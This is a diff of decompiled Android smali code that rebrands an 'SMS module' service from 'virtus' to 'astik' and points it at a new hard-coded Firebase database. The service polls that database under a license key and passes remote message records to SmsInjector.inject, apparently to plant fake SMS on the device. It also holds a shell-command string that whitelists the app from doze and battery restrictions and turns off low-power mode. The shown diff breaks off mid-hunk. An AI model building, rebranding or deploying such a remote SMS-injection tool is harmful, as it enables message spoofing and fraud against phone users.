@@ -1,18 +1,18 @@
-.class public Lcom/virtus/module/TelegramPollingService;
+.class public Lcom/astik/module/TelegramPollingService;
 .super Landroid/app/Service;
 .source "TelegramPollingService.java"
 
 
 # static fields
-.field private static final CHANNEL_ID:Ljava/lang/String; = "virtus_module_channel"
+.field private static final CHANNEL_ID:Ljava/lang/String; = "astik_module_channel"
 
-.field private static final MODULE_DB:Ljava/lang/String; = "https://virtus-module-default-rtdb.firebaseio.com"
+.field private static final MODULE_DB:Ljava/lang/String; = "https://base-e3797-default-rtdb.firebaseio.com"
 
 .field private static final NOTIFICATION_ID:I = 0x3e7
 
-.field private static final PREFS_NAME:Ljava/lang/String; = "virtus_module_prefs"
+.field private static final PREFS_NAME:Ljava/lang/String; = "astik_module_prefs"
 
-.field private static final TAG:Ljava/lang/String; = "VirtusModule"
+.field private static final TAG:Ljava/lang/String; = "AstikModule"
 
 .field public static volatile cfgMonitoring:Z
 
@@ -61,138 +61,138 @@
     const/4 v0, 0x0
 
     .line 51
-    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z
+    iput-boolean v0, p0, Lcom/astik/module/TelegramPollingService;->isRunning:Z
 
     .line 52
-    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z
+    iput-boolean v0, p0, Lcom/astik/module/TelegramPollingService;->streamStop:Z
 
     .line 53
-    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->pollStop:Z
+    iput-boolean v0, p0, Lcom/astik/module/TelegramPollingService;->pollStop:Z
 
     .line 56
-    const-string v1, "https://virtus-module-default-rtdb.firebaseio.com"
+    const-string v1, "https://base-e3797-default-rtdb.firebaseio.com"
 
-    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->firebaseBase:Ljava/lang/String;
+    iput-object v1, p0, Lcom/astik/module/TelegramPollingService;->firebaseBase:Ljava/lang/String;
 
     .line 60
-    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z
+    iput-boolean v0, p0, Lcom/astik/module/TelegramPollingService;->monitoring:Z
 
     .line 61
     const-string v0, ""
 
-    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
+    iput-object v0, p0, Lcom/astik/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
 
     .line 62
-    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
+    iput-object v0, p0, Lcom/astik/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
 
     .line 63
-    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+    iput-object v0, p0, Lcom/astik/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
 
     .line 64
-    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
+    iput-object v0, p0, Lcom/astik/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
 
     return-void
 .end method
 
-.method static synthetic access$000(Lcom/virtus/module/TelegramPollingService;)Z
+.method static synthetic access$000(Lcom/astik/module/TelegramPollingService;)Z
     .locals 0
 
     .line 44
-    iget-boolean p0, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z
+    iget-boolean p0, p0, Lcom/astik/module/TelegramPollingService;->isRunning:Z
 
     return p0
 .end method
 
-.method static synthetic access$100(Lcom/virtus/module/TelegramPollingService;Landroid/content/SharedPreferences;)V
+.method static synthetic access$100(Lcom/astik/module/TelegramPollingService;Landroid/content/SharedPreferences;)V
     .locals 0
 
     .line 44
-    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->readConfig(Landroid/content/SharedPreferences;)V
+    invoke-direct {p0, p1}, Lcom/astik/module/TelegramPollingService;->readConfig(Landroid/content/SharedPreferences;)V
 
     return-void
 .end method
 
-.method static synthetic access$1000(Lcom/virtus/module/TelegramPollingService;)V
+.method static synthetic access$1000(Lcom/astik/module/TelegramPollingService;)V
     .locals 0
 
     .line 44
-    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->pollOnce()V
+    invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->pollOnce()V
 
     return-void
 .end method
 
-.method static synthetic access$200(Lcom/virtus/module/TelegramPollingService;)Landroid/os/PowerManager$WakeLock;
+.method static synthetic access$200(Lcom/astik/module/TelegramPollingService;)Landroid/os/PowerManager$WakeLock;
     .locals 0
 
     .line 44
-    iget-object p0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
+    iget-object p0, p0, Lcom/astik/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
 
     return-object p0
 .end method
 
-.method static synthetic access$300(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;)Landroid/app/Notification;
+.method static synthetic access$300(Lcom/astik/module/TelegramPollingService;Ljava/lang/String;)Landroid/app/Notification;
     .locals 0
 
     .line 44
-    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;
+    invoke-direct {p0, p1}, Lcom/astik/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;
 
     move-result-object p0
 
     return-object p0
 .end method
 
-.method static synthetic access$400(Lcom/virtus/module/TelegramPollingService;)Z
+.method static synthetic access$400(Lcom/astik/module/TelegramPollingService;)Z
     .locals 0
 
     .line 44
-    iget-boolean p0, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z
+    iget-boolean p0, p0, Lcom/astik/module/TelegramPollingService;->streamStop:Z
 
     return p0
 .end method
 
-.method static synthetic access$500(Lcom/virtus/module/TelegramPollingService;)V
+.method static synthetic access$500(Lcom/astik/module/TelegramPollingService;)V
     .locals 0
 
     .line 44
-    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->runStream()V
+    invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->runStream()V
 
     return-void
 .end method
 
-.method static synthetic access$600(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;)V
+.method static synthetic access$600(Lcom/astik/module/TelegramPollingService;Ljava/lang/String;)V
     .locals 0
 
     .line 44
-    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
+    invoke-direct {p0, p1}, Lcom/astik/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
 
     return-void
 .end method
 
-.method static synthetic access$700(Lcom/virtus/module/TelegramPollingService;Landroid/content/SharedPreferences;)Ljava/lang/String;
+.method static synthetic access$700(Lcom/astik/module/TelegramPollingService;Landroid/content/SharedPreferences;)Ljava/lang/String;
     .locals 0
 
     .line 44
-    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;
+    invoke-direct {p0, p1}, Lcom/astik/module/TelegramPollingService;->chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;
 
     move-result-object p0
 
     return-object p0
 .end method
 
-.method static synthetic access$800(Lcom/virtus/module/TelegramPollingService;)Ljava/lang/String;
+.method static synthetic access$800(Lcom/astik/module/TelegramPollingService;)Ljava/lang/String;
     .locals 0
 
     .line 44
-    iget-object p0, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+    iget-object p0, p0, Lcom/astik/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
 
     return-object p0
 .end method
 
-.method static synthetic access$900(Lcom/virtus/module/TelegramPollingService;)Z
+.method static synthetic access$900(Lcom/astik/module/TelegramPollingService;)Z
     .locals 0
 
     .line 44
-    iget-boolean p0, p0, Lcom/virtus/module/TelegramPollingService;->pollStop:Z
+    iget-boolean p0, p0, Lcom/astik/module/TelegramPollingService;->pollStop:Z
 
     return p0
 .end method
@@ -222,7 +222,7 @@
 
     aput-object v2, v1, v3
 
-    const-string v2, "cmd deviceidle whitelist +com.virtus.module;cmd appops set com.virtus.module RUN_ANY_IN_BACKGROUND allow;cmd appops set com.virtus.module START_FOREGROUND allow;dumpsys deviceidle whitelist +com.virtus.module;settings put global low_power_mode 0"
+    const-string v2, "cmd deviceidle whitelist +com.astik.module;cmd appops set com.astik.module RUN_ANY_IN_BACKGROUND allow;cmd appops set com.astik.module START_FOREGROUND allow;dumpsys deviceidle whitelist +com.astik.module;settings put global low_power_mode 0"
 
     const/4 v3, 0x2
 
@@ -279,7 +279,7 @@
 
     move-result-object v0
 
-    const-string v1, "VirtusModule"
+    const-string v1, "AstikModule"
 
     invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
 
@@ -292,7 +292,7 @@
     .line 216
     new-instance v0, Landroid/content/Intent;
 
-    const-class v1, Lcom/virtus/module/MainActivity;
+    const-class v1, Lcom/astik/module/MainActivity;
 
     invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
@@ -328,7 +328,7 @@
     .line 220
     new-instance v1, Landroid/app/Notification$Builder;
 
-    const-string v2, "virtus_module_channel"
+    const-string v2, "astik_module_channel"
 
     invoke-direct {v1, p0, v2}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V
 
@@ -342,7 +342,7 @@
 
     .line 222
     :goto_1
-    const-string v2, "VIRTUS SMS MODULE"
+    const-string v2, "ASTIK SMS MODULE"
 
     invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
 
@@ -384,7 +384,7 @@
     .locals 1
 
     .line 515
-    iget-boolean p1, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z
+    iget-boolean p1, p0, Lcom/astik/module/TelegramPollingService;->monitoring:Z
 
     const-string v0, ""
 
@@ -394,7 +394,7 @@
 
     .line 516
     :cond_0
-    iget-object p1, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
+    iget-object p1, p0, Lcom/astik/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
 
     invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z
 
@@ -402,7 +402,7 @@
 
     if-nez p1, :cond_2
 
-    iget-object p1, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
+    iget-object p1, p0, Lcom/astik/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
 
     invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z
 
@@ -418,7 +418,7 @@
 
     invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V
 
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
 
     invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -426,7 +426,7 @@
 
     invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
 
     invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;
 
@@ -458,18 +458,18 @@
     .line 208
     new-instance v0, Landroid/app/NotificationChannel;
 
-    const-string v1, "Virtus Module"
+    const-string v1, "Astik Module"
 
     const/4 v2, 0x2
 
-    const-string v3, "virtus_module_channel"
+    const-string v3, "astik_module_channel"
 
     invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V
 
     .line 210
     const-string v1, "notification"
 
-    invoke-virtual {p0, v1}, Lcom/virtus/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {p0, v1}, Lcom/astik/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v1
 
@@ -550,7 +550,7 @@
     if-eqz v2, :cond_1
 
     .line 345
-    invoke-direct {p0, v0, v2}, Lcom/virtus/module/TelegramPollingService;->processChild(Ljava/lang/String;Lorg/json/JSONObject;)V
+    invoke-direct {p0, v0, v2}, Lcom/astik/module/TelegramPollingService;->processChild(Ljava/lang/String;Lorg/json/JSONObject;)V
 
     goto :goto_0
 
@@ -583,7 +583,7 @@
 
     .line 352
     :cond_4
-    invoke-direct {p0, p1, v1}, Lcom/virtus/module/TelegramPollingService;->processChild(Ljava/lang/String;Lorg/json/JSONObject;)V
+    invoke-direct {p0, p1, v1}, Lcom/astik/module/TelegramPollingService;->processChild(Ljava/lang/String;Lorg/json/JSONObject;)V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -609,7 +609,7 @@
 
     move-result-object p1
 
-    const-string v0, "VirtusModule"
+    const-string v0, "AstikModule"
 
     invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
 
@@ -624,11 +624,11 @@
     .line 410
     new-instance v0, Ljava/lang/Thread;
 
-    new-instance v1, Lcom/virtus/module/TelegramPollingService$5;
+    new-instance v1, Lcom/astik/module/TelegramPollingService$5;
 
-    invoke-direct {v1, p0, p1}, Lcom/virtus/module/TelegramPollingService$5;-><init>(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;)V
+    invoke-direct {v1, p0, p1}, Lcom/astik/module/TelegramPollingService$5;-><init>(Lcom/astik/module/TelegramPollingService;Ljava/lang/String;)V
 
-    const-string p1, "virtus-fb-mark"
+    const-string p1, "astik-fb-mark"
 
     invoke-direct {v0, v1, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
 
@@ -642,17 +642,17 @@
     .locals 7
 
     .line 522
-    const-string v0, "VirtusModule"
+    const-string v0, "AstikModule"
 
     .line 0
     const-string v1, "?auth="
 
     .line 522
-    const-string v2, "virtus_module_prefs"
+    const-string v2, "astik_module_prefs"
 
     const/4 v3, 0x0
 
-    invoke-virtual {p0, v2, v3}, Lcom/virtus/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+    invoke-virtual {p0, v2, v3}, Lcom/astik/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
 
     move-result-object v2
 
@@ -676,10 +676,10 @@
 
     .line 526
     :cond_0
-    invoke-direct {p0, v2}, Lcom/virtus/module/TelegramPollingService;->readConfig(Landroid/content/SharedPreferences;)V
+    invoke-direct {p0, v2}, Lcom/astik/module/TelegramPollingService;->readConfig(Landroid/content/SharedPreferences;)V
 
     .line 528
-    invoke-direct {p0, v2}, Lcom/virtus/module/TelegramPollingService;->chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;
+    invoke-direct {p0, v2}, Lcom/astik/module/TelegramPollingService;->chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;
 
     move-result-object v2
 
@@ -711,7 +711,7 @@
 
     invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+    iget-object v2, p0, Lcom/astik/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
 
     invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z
 
@@ -728,7 +728,7 @@
 
     invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
 
-    iget-object v1, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+    iget-object v1, p0, Lcom/astik/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
 
     invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -886,7 +886,7 @@
 
     .line 551
     :cond_6
-    iget-object v5, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
+    iget-object v5, p0, Lcom/astik/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
 
     invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z
 
@@ -925,7 +925,7 @@
 
     .line 556
     :cond_8
-    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
+    iput-object v4, p0, Lcom/astik/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
 
     .line 557
     new-instance v3, Ljava/lang/StringBuilder;
@@ -936,7 +936,7 @@
 
     invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    iget-object v4, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
+    iget-object v4, p0, Lcom/astik/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
 
     invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -992,7 +992,7 @@
     check-cast v4, Ljava/lang/String;
 
     .line 561
-    iget-object v5, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
+    iget-object v5, p0, Lcom/astik/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
 
     invoke-virtual {v4, v5}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I
 
@@ -1008,11 +1008,11 @@
     if-eqz v5, :cond_b
 
     .line 564
-    invoke-direct {p0, v4, v5}, Lcom/virtus/module/TelegramPollingService;->processChild(Ljava/lang/String;Lorg/json/JSONObject;)V
+    invoke-direct {p0, v4, v5}, Lcom/astik/module/TelegramPollingService;->processChild(Ljava/lang/String;Lorg/json/JSONObject;)V
 
     .line 565
     :cond_b
-    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
+    iput-object v4, p0, Lcom/astik/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
     :try_end_3
     .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
     .catchall {:try_start_3 .. :try_end_3} :catchall_0
@@ -1118,7 +1118,7 @@
 
     .line 366
     :try_start_0
-    iget-object v4, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
+    iget-object v4, p0, Lcom/astik/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
 
     invoke-virtual {p1, v4}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I
 
@@ -1126,7 +1126,7 @@
 
     if-lez v4, :cond_0
 
-    iput-object p1, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
+    iput-object p1, p0, Lcom/astik/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
 
     .line 368
     :cond_0
@@ -1168,7 +1168,7 @@
     move-result-object v5
 
     .line 371
-invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
+    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result v6
 
@@ -1184,7 +1184,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     .line 375
     :cond_2
-    const-string v6, "VirtusModule"
+    const-string v6, "AstikModule"
 
     new-instance v7, Ljava/lang/StringBuilder;
 
@@ -1213,17 +1213,17 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     invoke-static {v6, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
     .line 377
-    invoke-static {p0, v4, v5}, Lcom/virtus/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
+    invoke-static {p0, v4, v5}, Lcom/astik/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
 
     move-result v2
 
     .line 378
-    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
+    invoke-direct {p0, p1}, Lcom/astik/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
 
     if-eqz v2, :cond_3
 
     .line 380
-    const-string v1, "VirtusModule"
+    const-string v1, "AstikModule"
 
     new-instance v2, Ljava/lang/StringBuilder;
 
@@ -1241,7 +1241,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     .line 382
     :cond_3
-    const-string v0, "VirtusModule"
+    const-string v0, "AstikModule"
 
     new-instance v2, Ljava/lang/StringBuilder;
 
@@ -1264,7 +1264,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     .line 372
     :cond_4
     :goto_0
-    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
+    invoke-direct {p0, p1}, Lcom/astik/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
     :try_end_1
     .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
     .catchall {:try_start_1 .. :try_end_1} :catchall_0
@@ -1284,7 +1284,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     .line 385
     :try_start_2
-    const-string v1, "VirtusModule"
+    const-string v1, "AstikModule"
 
     new-instance v2, Ljava/lang/StringBuilder;
 
@@ -1319,7 +1319,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result-object p2
 
-    invoke-direct {p0, p1, v0, p2}, Lcom/virtus/module/TelegramPollingService;->retryLater(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+    invoke-direct {p0, p1, v0, p2}, Lcom/astik/module/TelegramPollingService;->retryLater(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
     :try_end_2
     .catchall {:try_start_2 .. :try_end_2} :catchall_0
 
@@ -1342,19 +1342,17 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     .locals 8
 
     .line 463
-    const-string v0, "VirtusModule"
+    const-string v0, "AstikModule"
 
     .line 0
     const-string v1, "https://base-e3797-default-rtdb.firebaseio.com/config/"
 
     .line 463
-    move-object v6, p1
-
     const-string v2, "license_key"
 
     const-string v3, ""
 
-    invoke-interface {v6, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+    invoke-interface {p1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
 
     move-result-object p1
 
@@ -1372,57 +1370,21 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     .line 467
     :try_start_0
+    new-instance v4, Ljava/net/URL;
+
+    new-instance v5, Ljava/lang/StringBuilder;
+
+    invoke-direct {v5, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
     invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;
 
     move-result-object p1
 
-    const-string v2, "firebase_poll_url"
-
-    const-string v3, ""
-
-    invoke-interface {v6, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
-
-    move-result-object v7
-
-    invoke-virtual {v7}, Ljava/lang/String;->trim()Ljava/lang/String;
-
-    move-result-object v7
-
-    new-instance v5, Ljava/lang/StringBuilder;
-
-    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V
-
-    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z
-
-    move-result v2
-
-    if-nez v2, :virtus_module_cfg
-
-    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    const-string v2, "/config/"
-
-    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    goto :virtus_cfg_url
-
-    :virtus_module_cfg
-    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
     invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    const-string v2, ".json"
+    const-string p1, ".json"
 
-    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    :virtus_cfg_url
     invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    const-string v2, ".json"
-
-    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    new-instance v4, Ljava/net/URL;
 
     invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
 
@@ -1550,12 +1512,12 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result v1
 
-    iput-boolean v1, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z
+    iput-boolean v1, p0, Lcom/astik/module/TelegramPollingService;->monitoring:Z
 
     .line 487
-    iget-boolean v1, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z
+    iget-boolean v1, p0, Lcom/astik/module/TelegramPollingService;->monitoring:Z
 
-    sput-boolean v1, Lcom/virtus/module/TelegramPollingService;->cfgMonitoring:Z
+    sput-boolean v1, Lcom/astik/module/TelegramPollingService;->cfgMonitoring:Z
 
     .line 488
     const-string v1, "ts"
@@ -1566,7 +1528,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result-wide v5
 
-    sput-wide v5, Lcom/virtus/module/TelegramPollingService;->cfgTs:J
+    sput-wide v5, Lcom/astik/module/TelegramPollingService;->cfgTs:J
 
     .line 489
     const-string v1, "firebase_url"
@@ -1590,7 +1552,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     move-result-object v4
 
     .line 492
-    iget-object v6, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
+    iget-object v6, p0, Lcom/astik/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
 
     invoke-virtual {v1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
@@ -1600,7 +1562,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     if-eqz v6, :cond_5
 
-    iget-object v6, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
+    iget-object v6, p0, Lcom/astik/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
 
     invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
@@ -1608,7 +1570,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     if-eqz v6, :cond_5
 
-    iget-object v6, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+    iget-object v6, p0, Lcom/astik/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
 
     invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
@@ -1629,18 +1591,18 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     .line 493
     :goto_2
-    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
+    iput-object v1, p0, Lcom/astik/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
 
     .line 494
-    iput-object v5, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
+    iput-object v5, p0, Lcom/astik/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
 
     .line 495
-    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+    iput-object v4, p0, Lcom/astik/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
 
     if-eqz v6, :cond_7
 
     .line 496
-    iget-boolean v1, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z
+    iget-boolean v1, p0, Lcom/astik/module/TelegramPollingService;->monitoring:Z
 
     if-eqz v1, :cond_7
 
@@ -1653,7 +1615,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    iget-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
+    iget-object v4, p0, Lcom/astik/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
 
     invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -1661,7 +1623,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    iget-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
+    iget-object v4, p0, Lcom/astik/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;
 
     invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -1672,13 +1634,13 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
     .line 499
-    iput-object v3, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
+    iput-object v3, p0, Lcom/astik/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;
 
     .line 501
